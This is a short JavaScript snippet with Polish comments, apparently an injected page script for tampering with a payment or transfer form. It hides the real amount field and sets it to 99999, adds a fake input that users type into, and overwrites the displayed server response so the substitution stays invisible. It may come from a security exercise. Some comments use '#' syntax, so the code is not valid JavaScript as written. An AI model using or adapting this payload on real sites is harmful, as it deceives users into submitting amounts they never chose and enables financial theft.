# Ukryć prawdziwe pole i ustawić mu naszą wartość
amount.style.display = "none"
value_label = document.getElementById("value-label")
amount.value = 99999;

#Stworzyć fejkowe pole które nic nie robi, ale użytkownik może sobie wpisywać wartości
fake_amount = document.createElement("input")
fake_amount.id = "fake_amount"
fake_amount.classList.add("form-control");

#Dodać fejkowe pole do DOM
value_label.parentNode.insertBefore(fake_amount, value_label.nextSibling)

#Zmienic response from server value
response_amount.innerHTML = fake_amount.value